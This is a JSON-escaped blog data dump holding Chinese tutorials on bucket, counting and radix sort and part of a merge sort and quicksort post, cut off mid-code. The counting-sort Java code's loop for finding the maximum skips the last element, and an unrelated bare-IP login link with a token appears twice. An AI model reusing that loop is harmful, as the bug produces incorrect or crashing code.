href=\"https://219.143.144.206:1443/relogin.html?ReloginCause=3&amp;LangMode=2&amp;UserID=&amp;RandomID=&amp;CsrfTk=VB3JXD3J2IUAZFXDYE3J&amp;\" target=\"_blank\" rel=\"noopener\">https://219.143.144.206:1443/relogin.html?ReloginCause=3&amp;LangMode=2&amp;UserID=&amp;RandomID=&amp;CsrfTk=VB3JXD3J2IUAZFXDYE3J&amp;</a></p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。</p>\n<p>这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要<strong>学习的重点是掌握这些排序算法的适用场景</strong>。</p>\n<p>按照惯例，我先给出一道思考题：<font color=\"red\"><strong>如何根据年龄给100万用户排序？</strong></font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n*logN)$。有没有更快的排序方法呢？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"桶排序\"><a href=\"#桶排序\" class=\"headerlink\" title=\"桶排序\"></a>桶排序</h3></div><br></div>\n\n<p>首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/桶排序原理图.jpg\">\n<p>桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。</p>\n<p>如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k*logk)$。m个桶排序的时间复杂度就是$O(m*k*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。</p>\n<p><strong>桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？</strong></p>\n<p>答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。</p>\n<p>首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。</p>\n<p>其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n*logN)$的排序算法了。</p>\n<p><strong>桶排序比较适合用在外部排序中</strong>，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。</p>\n<p>比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？</p>\n<p>现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。</p>\n<p>我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 … 99）。</p>\n<p>理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。</p>\n<p>不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？</p>\n<p>针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元……901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"计数排序\"><a href=\"#计数排序\" class=\"headerlink\" title=\"计数排序\"></a>计数排序</h3></div><br></div>\n\n<p>个人觉得，<strong>计数排序其实是桶排序的一种特殊情况</strong>。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。</p>\n<p>我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？</p>\n<p>考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。</p>\n<p>计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。<strong>不过，为什么这个算法叫做”计数”排序呢？”计数”的含义来自哪里？</strong></p>\n<p>想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。</p>\n<p>考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计算排序01.jpg\">\n<p>从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序02.jpg\">\n<p>那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。</p>\n<p>思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序03.jpg\">\n<p>有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。</p>\n<p>我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。</p>\n<p>以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序04.jpg\">\n<p>上面的过程有点复杂，我将其写成代码如下，你可以对照看下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CountSort</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[] &#123;<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">10</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">// 20个人的成绩进行计数排序</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序前：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">        countSort(a);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序后：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">countSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> n = a.length;</span><br><span class=\"line\">        <span class=\"comment\">/* 创建桶数组C */</span></span><br><span class=\"line\">        <span class=\"comment\">// 1、查找原数组的数据范围（必须是正整数）</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> max = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;a.length-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a[i]&gt;max)&#123;</span><br><span class=\"line\">                max = a[i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2、根据数据范围创建桶数组</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] C = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[max+<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"comment\">// 2.1、扫描原数组，将数据的个数放入桶C中</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> anA : a) &#123;</span><br><span class=\"line\">            C[anA]++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2.2、将C数组中的数据依次累加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=max;i++)&#123;</span><br><span class=\"line\">            C[i] = C[i-<span class=\"number\">1</span>] + C[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 3、根据C桶中的计数将原数组a中的数据依次放入A数组中</span></span><br><span class=\"line\">        <span class=\"comment\">// 3.1、创建临时数组A</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] A = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">        <span class=\"comment\">// 3.2、从后向前扫描a，并根据C放入A</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n-<span class=\"number\">1</span>; i&gt;=<span class=\"number\">0</span>; i--)&#123;</span><br><span class=\"line\">            A[C[a[i]]-<span class=\"number\">1</span>] = a[i];</span><br><span class=\"line\">            C[a[i]]--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 4、拷贝数组A到原数组a</span></span><br><span class=\"line\">        System.arraycopy(A, <span class=\"number\">0</span>, a, <span class=\"number\">0</span>, n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。</p>\n<p>总结一下，<strong>计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。</strong></p>\n<p>比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h3></div><br></div>\n\n<p>我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？</p>\n<p>我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。</p>\n<p>刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。</p>\n<p>借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。</p>\n<p>手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/基数排序01.jpg\">\n<p>注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。</p>\n<p>根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。</p>\n<p>实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？</p>\n<p>实际上，<strong>我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”</strong>，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。</p>\n<p>总结一下，<strong>基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。</p>\n<p>实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。</p>\n<p>桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。</p>\n<p>假设我们现在需要对D,a,F,B,c,A,z这个字符串进行排序，要求将其中所有的小写字母都排在大写字母的前面，但小写字母内部和大写字母内部不要求有序。比如经过排序之后为a,c,z,D,F,B,A，这个如何来实现呢？如果字符串中存储的不仅有大小写字母，还有数字，要将小写字母放到前面，大写字母放到最后，数字放到中间，不用排序算法，又该怎么解决呢？</p>\n<p><a href=\"https://219.143.144.206:1443/relogin.html?ReloginCause=3&amp;LangMode=2&amp;UserID=&amp;RandomID=&amp;CsrfTk=VB3JXD3J2IUAZFXDYE3J&amp;\" target=\"_blank\" rel=\"noopener\">https://219.143.144.206:1443/relogin.html?ReloginCause=3&amp;LangMode=2&amp;UserID=&amp;RandomID=&amp;CsrfTk=VB3JXD3J2IUAZFXDYE3J&amp;</a></p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-排序(中)","date":"2018-09-23T03:44:14.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，**归并排序**和**快速排序**。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。\n\n归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：**如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？**，这就要用到今天讲的内容。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的原理\n{% endnote %}\n</div>\n\n我们先来看看**归并排序**。\n\n归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。\n\n{% asset_img 归并排序原理图.jpg 归并排序原理图 %}\n\n归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。\n\n从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。**分治是一种解决问题的处理思想，递归是一种编程技巧**，这两者并不冲突。\n\n前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。\n\n我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。\n\n```java\n递推公式\nmerge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+1...r))\n\n终止条件\np>=r 不在继续分解\n```\n\n我来解释一下这个公式，merge_sort(p...r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p...q)和merge_sort(q+1...r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。\n\n有了递推公式，转化成代码就简单多了。\n\n```java\n// 归并排序\npublic static void merge_sort(int[] a, int n){\n    merge_sort(a, 0, n-1);\n}\nprivate static void merge_sort(int[] a, int p, int r){\n    // 递归终止条件\n    if (p>=r) return;\n    // 获取分区点\n    int q = p + (r-p)/2;\n    // 分治排序左边\n    merge_sort(a, p, q);\n    // 分治排序右边\n    merge_sort(a, q+1, r);\n    // 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]\n    merge(a, p, q, r);\n}\n\n// 合并数组\nprivate static void merge(int[] a, int p, int q, int r){\n    int i = p;\n    int j = q + 1;\n    int k = 0;\n    // 合并数组 a[p, q]  a[q+1, r] 到临时数组temp\n    // 申请一个临时数组\n    int[] temp = new int[r - p + 1];\n    // 根据两个数组最短的长度进行比较添加到temp中\n    while (i<=q&& j<=r){\n        if (a[i]<=a[j]){\n            temp[k++] = a[i++];\n        }else {\n            temp[k++] = a[j++];\n        }\n    }\n\n    // 看哪个数组还没有完成，将其放到temp后\n    if (i<=q){\n        while (i<=q){\n            temp[k++] = a[i++];\n        }\n    }else {\n        while (j<=r){\n            temp[k++] = a[j++];\n        }\n    }\n    System.out.println(Arrays.toString(temp));\n\n    // 将temp中对应的数据放入原数组中\n    for (i = 0; i <= r-p; i++) {\n        a[p+i] = temp[i];\n    }\n}\n```\n\n你可能已经发现了，merge(A[p...r], A[p...q], A[q+1...r])这个函数的作用就是，讲已经有序的A[p...q]和A[q+1...r]合并成另一个有序的数组，并且放入A[p...r]。那这个过程具体该怎么做呢？\n\n如图所示，我们申请一个临时数组temp，大小与A[p...r]相同。我们用两个指针i，j分别指向A[p...q]和A[q+1...r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。\n\n继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p...r]中。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的性能分析\n{% endnote %}\n</div>\n\n还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。\n\n**第一、 归并排序是稳定的排序算法吗？**\n\n结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。\n\n在合并的过程中，如果A[p...q]和A[q+1...r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p...q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。\n\n**第二、归并排序的时间复杂度是多少？**\n\n归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。\n\n在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。\n\n我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。\n\n从上面的分析，我们得出一个重要的结论：**不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式**。\n\n套用这个公式，我们来分析一下归并排序的时间复杂度。\n\n我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：\n$$ \n\\begin{cases}\nT(1) = C; & n=1 \\\\\\\\[2ex]\nT(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1 \n\\end{cases}\n$$\n\n通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程\n\n$$\n\\\\begin{align\\*}\nT(n) \\\\ &= \\\\ 2\\*T(\\frac{n}{2}) \\\\ + \\\\ n \\\\\\\\[2ex]\n&= 2\\*(2 \\* T(\\frac{n}{4}) + \\frac{n}{2}) \\\\  + \\\\ n \\qquad = 4\\*T(\\frac{n}{4}) + 2\\*n \\\\\\\\[2ex]\n&= 4\\*(2\\* T(\\frac{n}{8}) + \\frac{n}{4}) \\\\  + \\\\ 2 \\* n \\\\ \\; = 8\\*T(\\frac{n}{8}) + 3\\*n \\\\\\\\[2ex]\n&= 8\\*(2\\* T(\\frac{n}{16}) + \\frac{n}{8}) \\\\  + \\\\ 3 \\* n \\\\ \\; = 16\\*T(\\frac{n}{16}) + 4\\*n \\\\\\\\[2ex]\n&= ...... \\\\\\\\[2ex]\n&= 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n\n\\\\end{align\\*}\n$$\n\n这样一步步推导，我们可以得到$T(n) \\\\ = \\\\ 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\\\ = \\\\ Cn + n\\*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n\\*log_{2}n)$。所以归并排序的时间复杂度是$O(n\\*log_{2}n)$。\n\n从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n\\*log_{2}n)$。\n\n**第三、归并排序是不是原地排序算法呢？**\n\n归并排序的时间复杂度在任何情况下都是$O(n\\*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。\n\n这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n\\*log_{2}n)$，该如何分析呢？\n\n如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n\\*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？\n\n实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的原理\n{% endnote %}\n</div>\n\n我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。\n\n快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。\n\n第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。\n\n根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。\n\n如果我们用递推公式来将上面的过程写出来的话，就是这样：\n\n```java\n# 递推公式\nquick_sort(p...r) = quick_sort(p...q-1)+quick_sort(q+1...r)\n\n# 终止条件\np>=r\n```\n\n我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。\n\n```java\nprivate static void quickSort(int[] arr, int n) {\n    if (n < 1) return;\n    quickSort(arr, 0 , n-1);\n}\nprivate static void quickSort(int[] arr, int left, int right) {\n    if (left>=right) return; \n    int mid = partation(arr, left, right);\n    quickSort(arr, left, mid-1);\n    quickSort(arr, mid+1, right);\n}\n\n// 